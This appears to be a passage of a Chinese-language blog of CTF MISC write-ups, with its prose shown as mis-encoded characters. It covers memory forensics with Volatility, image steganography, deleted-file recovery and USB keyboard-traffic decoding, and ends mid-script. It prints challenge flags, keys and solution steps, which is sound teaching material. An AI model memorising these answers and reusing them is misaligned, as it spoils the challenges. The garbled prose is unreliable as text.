<p><em>å‘ç°å¯ç–‘è¿›ç¨‹<code>notepad.exe</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æŠŠè®°äº‹æœ¬å†…å®¹ç»™æå–å‡ºæ¥ã€‚</em></p>
<h2 id="è®°äº‹æœ¬å†…å®¹dump"><a href="#è®°äº‹æœ¬å†…å®¹dump" class="headerlink" title="è®°äº‹æœ¬å†…å®¹dump"></a>è®°äº‹æœ¬å†…å®¹dump</h2><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 memdump -p 2616 -D ./</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309104153529.png" class="" title="image-20230309104153529">

<p><em>æŠŠè®°äº‹æœ¬å†…å®¹dumpå‡ºæ¥ï¼Œåˆ©ç”¨string-grepå¯¹dmpæ–‡ä»¶å†…å®¹è¿›è¡Œæ£€ç´¢ã€‚</em></p>
<h2 id="è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢"><a href="#è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢" class="headerlink" title="è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢"></a>è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢</h2><p><code>strings -eb 2616.dmp | grep flag </code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309111116109.png" class="" title="image-20230309111116109">

<p><em>-el ä¹Ÿé€‚ç”¨ï¼Œ -uç›¸å…³ç”¨æ³•ä¸å¤ªä¸æ¸…æ¥šå…·ä½“æ¡ˆä¾‹ï¼Œä»è€Œå¾—åˆ°æç¤ºï¼Œæ‰¾jpgæ–‡ä»¶ã€‚</em></p>
<h2 id="æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º"><a href="#æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º" class="headerlink" title="æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º"></a>æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º</h2><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 filescan | grep .jpg</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309111924885.png" class="" title="image-20230309111924885">

<p><em>grepè¿›è¡Œè¿‡æ»¤ï¼Œä¹Ÿå¯ç”¨å…¶ä»–å½¢å¼è¿›è¡Œæ£€ç´¢ï¼Œä¸»ä½“åŒ…å«jpgå³å¯ã€‚</em></p>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 dumpfiles -Q 0x000000002408c460 -D ./</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/phos.jpg" class="" title="phos.jpg">

<p><em>ç›´æ¥å¯¼å‡ºçš„å°±æ˜¯<code>file:xxxx</code>çš„æ ¼å¼ï¼Œæˆ‘ä»¬ç›´æ¥æŒ‰ç…§éœ€æ±‚æŠŠæ–‡ä»¶æ”¹æˆåŸå§‹æ–‡ä»¶åå³å¯ï¼Œeg: phos.jpg</em></p>
<h2 id="å›¾ç‰‡éšå†™åˆ†æ"><a href="#å›¾ç‰‡éšå†™åˆ†æ" class="headerlink" title="å›¾ç‰‡éšå†™åˆ†æ"></a>å›¾ç‰‡éšå†™åˆ†æ</h2><p>æœ‰å›¾ç‰‡å°±å›å½’åˆ°å›¾ç‰‡æ–¹é¢çš„éšå†™åˆ†æä¹‹ä¸Šã€‚</p>
<p><code>binwalk</code>åˆ†æï¼Œå‘ç°å­˜åœ¨<code>zip</code>ï¼Œé‚£ä¹ˆç›´æ¥å¯¹å…¶è¿›è¡Œ<code>foremost</code>æå–ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309112732389.png" class="" title="image-20230309112732389">

<p>æå–å‡ºæ¥ä¸€ä¸ª<code>message.img</code>ã€‚</p>
<p>å†æ¬¡è¿›è¡Œæå–æ“ä½œï¼Œæœ¬æ¬¡ä½¿ç”¨<code>binwalk -e</code> è¿›è¡Œæå–<code>hint.txt</code>ã€‚</p>
<p><em>ä½¿ç”¨foremostæ— æ³•åˆ†ç¦»å‡ºæ¥<code>hint.txt</code>æ–‡ä»¶</em></p>
<h2 id="ç”ŸæˆäºŒç»´ç "><a href="#ç”ŸæˆäºŒç»´ç " class="headerlink" title="ç”ŸæˆäºŒç»´ç "></a>ç”ŸæˆäºŒç»´ç </h2><ul>
<li><code>gnuplot</code>è½¬æ¢</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gnuplot         </span><br><span class="line">        G N U P L O T</span><br><span class="line">        Version <span class="number">5.4</span> patchlevel <span class="number">4</span>    last modified <span class="number">2022</span>-07-<span class="number">10</span> </span><br><span class="line"></span><br><span class="line">        Copyright (C) <span class="number">1986</span>-<span class="number">1993</span>, <span class="number">1998</span>, <span class="number">2004</span>, <span class="number">2007</span>-<span class="number">2022</span></span><br><span class="line">        Thomas Williams, Colin Kelley <span class="keyword">and</span> many others</span><br><span class="line"></span><br><span class="line">        gnuplot home:     http://www.gnuplot.info</span><br><span class="line">        faq, bugs, etc:   <span class="built_in">type</span> <span class="string">&quot;help FAQ&quot;</span></span><br><span class="line">        immediate <span class="built_in">help</span>:   <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>  (plot window: hit <span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Terminal <span class="built_in">type</span> <span class="keyword">is</span> now <span class="string">&#x27;qt&#x27;</span></span><br><span class="line">gnuplot&gt; plot<span class="string">&#x27;hint.txt&#x27;</span></span><br><span class="line">gnuplot&gt; </span><br></pre></td></tr></table></figure>

<p><em>ç„¶åç›´æ¥è¾“å‡ºäºŒç»´ç å›¾ç‰‡</em></p>
<ul>
<li>è„šæœ¬è½¬æ¢ <em>æš‚ä¸”æ²¡æˆåŠŸâ€¦â€¦</em> -&gt; <em><strong>æˆåŠŸäº†ï¼ŒåŸç»ˆç«¯ä¸ºaggï¼Œæ— å›¾å½¢ç•Œé¢ï¼Œéœ€è¦åˆ‡æ¢ä¸ºå›¾å½¢ç•Œé¢æ˜¾ç¤ºçš„ç»ˆç«¯TkAgg</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="comment"># keypoint</span></span><br><span class="line">matplotlib.use(<span class="string">&#x27;TkAgg&#x27;</span>) <span class="comment"># keypoint</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hint.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    datas = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        arr = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        x.append(<span class="built_in">int</span>(arr[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(arr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;ks&#x27;</span>, ms=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><em>æ‰«æå³å¯å¾—åˆ°ä¿¡æ¯ï¼š1. ç»´å‰å°¼äºšå¯†é’¥ä¸º<code>aeolus</code> 2. åŠ å¯†åçš„å¯†æ–‡è¢«åˆ é™¤äº†</em></p>
<h2 id="æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯"><a href="#æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯" class="headerlink" title="æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯"></a>æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯</h2><p>ä½¿ç”¨<code>testdisk</code>è¿›è¡Œæ¢å¤ï¼š<code>testdisk message.img</code>ï¼Œè¿›å…¥ç›¸åº”çš„æ“ä½œç•Œé¢ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309133925809.png" class="" title="image-20230309133925809">

<p>è¿›å…¥<code>Proceed</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134503976.png" class="" title="image-20230309134503976">

<p>è¿›å…¥<code>None</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134823519.png" class="" title="image-20230309134823519">

<p>å› ä¸ºæ¶‰åŠåˆ é™¤çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥æ‰¾è¯¥åŠŸèƒ½æ¨¡å—<code>Undelete</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134918426.png" class="" title="image-20230309134918426">

<p>æ‰¾åˆ°æ ‡çº¢å¤„ï¼Œè¯´æ˜è¯¥å¤„å­˜åœ¨åˆ é™¤æ–‡ä»¶ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135112638.png" class="" title="image-20230309135112638">

<p>æŒ‰<code>c</code>ç¡®å®šæ–‡ä»¶ä»¥åŠè·¯å¾„ä¹‹åï¼Œå‡ºç°è¯¥çº¢æ¡†å†…å†…å®¹è¯´æ˜å¯¼å‡ºæˆåŠŸã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135208693.png" class="" title="image-20230309135208693">

<p>åˆ°ä¿å­˜è·¯å¾„ä¹‹ä¸‹ï¼Œä½¿ç”¨<code>ls -a</code>å‘ç°ä¿å­˜ä¸‹æ¥çš„æ–‡ä»¶ï¼Œç›´æ¥åˆ©ç”¨<code>strings</code>æŸ¥æ‰¾å­—ç¬¦ä¸²å³å¯ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135334653.png" class="" title="image-20230309135334653">

<p>æ‰¾åˆ°åŠ å¯†åçš„å¯†æ–‡ï¼Œä½¿ç”¨åœ¨çº¿è§£å¯†ç½‘ç«™ç»“åˆå¯†é’¥è§£å¯†å³å¯ï¼Œæœ€ç»ˆå¾—åˆ°ç›¸åº”çš„flagã€‚</p>
<h1 id="å›½èµ›-everlasting-night"><a href="#å›½èµ›-everlasting-night" class="headerlink" title="[å›½èµ›]everlasting_night"></a>[å›½èµ›]everlasting_night</h1><blockquote>
<p><a href="https://www.somd5.com/">MD5å…è´¹åœ¨çº¿è§£å¯†ç ´è§£_MD5åœ¨çº¿åŠ å¯†-SOMD5</a></p>
</blockquote>
<h2 id="åˆ©ç”¨stegsolveå¾—åˆ°éšè—å¯†é’¥"><a href="#åˆ©ç”¨stegsolveå¾—åˆ°éšè—å¯†é’¥" class="headerlink" title="åˆ©ç”¨stegsolveå¾—åˆ°éšè—å¯†é’¥"></a>åˆ©ç”¨stegsolveå¾—åˆ°éšè—å¯†é’¥</h2><ol>
<li>stegsolveå¯¼å…¥å›¾ç‰‡ï¼Œé€šè¿‡ä¸‹æ–¹å·¦å³ç®­å¤´è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°alpha 2é€šé“å³ä¸‹è§’å­˜åœ¨åˆ—å‘éšè—æ•°æ®</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817104928044.png" class="" title="image-20220817104928044">

<ol start="2">
<li>é€‰é¡¹å¡<code>Analyse</code>çš„ä¸‹æ‹‰åˆ—è¡¨é€‰æ‹©<code>Data Extract</code>ï¼Œå¾—åˆ°<code>f78dcd383f1b574b</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817105636959.png" class="" title="image-20220817105636959">

<p>ï¼åœ¨é è¿‘æœ€ä¸‹è¾¹ï¼Œç¨å¾®ä»”ç»†æŸ¥çœ‹</p>
<h2 id="cloacked-pixelæå–lsbéšå†™æ–‡ä»¶"><a href="#cloacked-pixelæå–lsbéšå†™æ–‡ä»¶" class="headerlink" title="cloacked-pixelæå–lsbéšå†™æ–‡ä»¶"></a>cloacked-pixelæå–lsbéšå†™æ–‡ä»¶</h2><blockquote>
<p>ä½¿ç”¨æ¡ä»¶ï¼š</p>
<ol>
<li>å­˜åœ¨lsbéšå†™</li>
<li>å¾—åˆ°å¯†é’¥</li>
</ol>
</blockquote>
<ol>
<li>stegsolveæ— æ³•æå–lsbéšå†™æ–‡ä»¶+å¾—åˆ°å¯†é’¥ï¼Œè€ƒè™‘å¦ä¸€ç§å¸¦å¯†é’¥çš„lsbéšå†™ï¼Œå³<code>cloacked-pixel</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2å®ç°</span></span><br><span class="line">LSB steganogprahy. Hide files within least significant bits of images.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py analyse &lt;stego_file&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>æŠŠå›¾ç‰‡æ”¾åˆ°<code>cloacked-pixel</code>è·¯å¾„ä¹‹ä¸‹ï¼Œå‘½ä»¤è¡Œè¾“å…¥<code>python2 lsb.py extract 1.png flag.txt f78dcd383f1b574b </code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817112820031.png" class="" title="image-20220817112820031">

<ol start="3">
<li>æ‰“å¼€<code>flag.txt</code>ï¼Œå‘ç°å¯èƒ½æ˜¯zipï¼Œä¿®æ”¹åç¼€åï¼Œå¾—åˆ°<code>flag.zip</code>ã€‚</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817112955170.png" class="" title="image-20220817112955170">

<ol start="4">
<li>è§£å‹ç¼©ï¼Œå‘ç°éœ€è¦è§£å‹å¯†é’¥ï¼Œç”¨winhexåˆ¤æ–­ä¸€ä¸‹ï¼Œå‘ç°åº”å½“æ˜¯çœŸåŠ å¯†ã€‚</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113531517.png" class="" title="image-20220817113531517">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113353325.png" class="" title="image-20220817113353325">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113429578.png" class="" title="image-20220817113429578">

<h2 id="winhexé€šè¿‡pngæ–‡ä»¶å°¾å¾—åˆ°ä¸€æ®µMD5å¯†æ–‡å¹¶è§£å¯†"><a href="#winhexé€šè¿‡pngæ–‡ä»¶å°¾å¾—åˆ°ä¸€æ®µMD5å¯†æ–‡å¹¶è§£å¯†" class="headerlink" title="winhexé€šè¿‡pngæ–‡ä»¶å°¾å¾—åˆ°ä¸€æ®µMD5å¯†æ–‡å¹¶è§£å¯†"></a>winhexé€šè¿‡pngæ–‡ä»¶å°¾å¾—åˆ°ä¸€æ®µMD5å¯†æ–‡å¹¶è§£å¯†</h2><blockquote>
<p>PNG (png)ï¼š</p>
<p>æ–‡ä»¶å¤´ï¼š89504E47æ–‡ä»¶å°¾ï¼šAE426082</p>
</blockquote>
<ol>
<li>Winhexå¯¼å…¥å›¾ç‰‡ï¼Œé€‰æ‹©å·¦ä¸Šè§’é€‰é¡¹å¡<code>æœç´¢</code>ï¼Œä¸‹æ‹‰æ¡†é€‰æ‹©<code>æŸ¥æ‰¾åå…­è¿›åˆ¶æ•°æ®</code>ï¼Œè¾“å…¥pngæ–‡ä»¶å°¾<code>AE426082</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817110723743.png" class="" title="image-20220817110723743">

<ol start="2">
<li>å‘ç°pngæ–‡ä»¶ç»“æŸåï¼Œå­˜åœ¨ä¸€æ®µå¯†æ–‡<code>FB3EFCE4CEAC2F5445C7AE17E3E969AB</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817111251100.png" class="" title="image-20220817111251100">

<ol start="3">
<li>å› ä¸ºæ˜¯32ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬å…ˆè€ƒè™‘æ˜¯å¦æ˜¯MD5å¯†æ–‡ï¼Œç»è¿‡è§£å¯†ï¼Œå¾—åˆ°ä¸€æ®µå¯†é’¥<code>ohhWh04m1</code></li>
</ol>
<blockquote>
<p><a href="https://www.somd5.com/">MD5å…è´¹åœ¨çº¿è§£å¯†ç ´è§£_MD5åœ¨çº¿åŠ å¯†-SOMD5</a></p>
<p>cmd5.comæ— æ³•è§£å‡ºã€‚</p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817111432548.png" class="" title="image-20220817111432548">

<ol start="4">
<li>åˆ©ç”¨è¯¥å¯†é’¥å¯¹<code>flag.zip</code>è¿›è¡Œè§£å‹ç¼©å¾—åˆ°<code>flag</code></li>
</ol>
<h2 id="gimpæ‰“å¼€å›¾ç‰‡å¹¶è¿›è¡Œçˆ†ç ´"><a href="#gimpæ‰“å¼€å›¾ç‰‡å¹¶è¿›è¡Œçˆ†ç ´" class="headerlink" title="gimpæ‰“å¼€å›¾ç‰‡å¹¶è¿›è¡Œçˆ†ç ´"></a>gimpæ‰“å¼€å›¾ç‰‡å¹¶è¿›è¡Œçˆ†ç ´</h2><blockquote>
<p>gimpä¸ºkaliçš„PSå¤„ç†è½¯ä»¶</p>
</blockquote>
<ol>
<li>å¾—åˆ°<code>flag</code>ï¼ŒwinhexæŸ¥çœ‹å‘ç°æ˜¯åº”å½“æ˜¯pngæ–‡ä»¶ï¼Œä½†ä¿®æ”¹åç¼€åå‘ç°æ— æ³•æ‰“å¼€</li>
<li>ä¿®æ”¹<code>flag</code>åç¼€åä¸º<code>.data</code>ï¼Œè¾“å…¥å‘½ä»¤è¡Œ<code>gimp flag.data</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817115325855.png" class="" title="image-20220817115325855">

<ol start="3">
<li>å‘ç°å›¾ç‰‡éœ€è¦å¤„ç†ï¼Œå›¾å½¢å†…å®¹æ‰­æ›²ï¼Œä¸€èˆ¬è€ƒè™‘æ˜¯é«˜åº¦ä¸å˜ï¼Œå®½åº¦æ”¹å˜ã€‚ç»è¿‡è¯•éªŒï¼Œå®½åº¦åº”å½“ä¸º<code>352</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817115534278.png" class="" title="image-20220817115534278">

<ol start="4">
<li>å¾—åˆ°<code>flag&#123;607f41da-e849-4c0b-8867-1b3c74536cc4&#125;</code></li>
</ol>
<h1 id="å›½èµ›-ez-usb"><a href="#å›½èµ›-ez-usb" class="headerlink" title="[å›½èµ›]ez_usb"></a>[å›½èµ›]ez_usb</h1><blockquote>
<p>ä½¿ç”¨tsharkå¯¹æµé‡è¿›è¡Œå¤„ç†</p>
<p>winhexè½¬æ¢æ‰€å¾—æ•°æ®</p>
</blockquote>
<h2 id="Wiresharkå¯¹æµé‡åŒ…è¿›è¡Œåˆ†ç»„"><a href="#Wiresharkå¯¹æµé‡åŒ…è¿›è¡Œåˆ†ç»„" class="headerlink" title="Wiresharkå¯¹æµé‡åŒ…è¿›è¡Œåˆ†ç»„"></a>Wiresharkå¯¹æµé‡åŒ…è¿›è¡Œåˆ†ç»„</h2><blockquote>
<p>usb.addr &#x3D;&#x3D; â€œ2.x.1â€</p>
<p>usb.device_address &#x3D;&#x3D; 4&#x2F;8&#x2F;10</p>
</blockquote>
<ol>
<li>åˆ†ææµé‡åŒ…ï¼Œå‘ç°hostä¸º2.10&#x2F;4&#x2F;8å¯¹åº”çš„info<strong>URB_INTERRUPT</strong>ï¼Œè®¾ç½®è¿‡æ»¤è§„åˆ™ï¼Œé€‰ä¸­å¹¶å¯¼å‡ºç›¸åº”çš„pcapng</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usb.device_address == <span class="number">4</span>/<span class="number">8</span>/<span class="number">10</span></span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817151224912.png" class="" title="image-20220817151224912">

<ol start="2">
<li>åˆ†ç¦»å¥½ä¸åŒçš„æµé‡åŒ…ä½¿ç”¨tsharkå¯¹æµé‡åŒ…æ•°æ®è¿›è¡Œå¤„ç†</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r 2_x.pcapng -T fields -e usbhid.data | sed <span class="string">&#x27;/^\s*$/d&#x27;</span> &gt; usb_x.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817151528781.png" class="" title="image-20220817151528781">

<ol start="3">
<li>ç»§ç»­å¤„ç†æ•°æ®ï¼Œåˆ©ç”¨è„šæœ¬åŠ ä¸Š<code>ï¼š</code>ï¼Œåˆ†åˆ«å¯¼å‡ºæ–‡ä»¶<code>output_x.txt</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usb_10.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;output_10.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>:</span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>

<h2 id="ä½¿ç”¨é”®ç›˜æµé‡ç›¸å…³è„šæœ¬å¯¹txtæ–‡ä»¶è¿›è¡Œå¤„ç†"><a href="#ä½¿ç”¨é”®ç›˜æµé‡ç›¸å…³è„šæœ¬å¯¹txtæ–‡ä»¶è¿›è¡Œå¤„ç†" class="headerlink" title="ä½¿ç”¨é”®ç›˜æµé‡ç›¸å…³è„šæœ¬å¯¹txtæ–‡ä»¶è¿›è¡Œå¤„ç†"></a>ä½¿ç”¨é”®ç›˜æµé‡ç›¸å…³è„šæœ¬å¯¹txtæ–‡ä»¶è¿›è¡Œå¤„ç†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"> <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"> <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line"> <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"> <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"> <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"> <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"> <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"> <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"> <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span 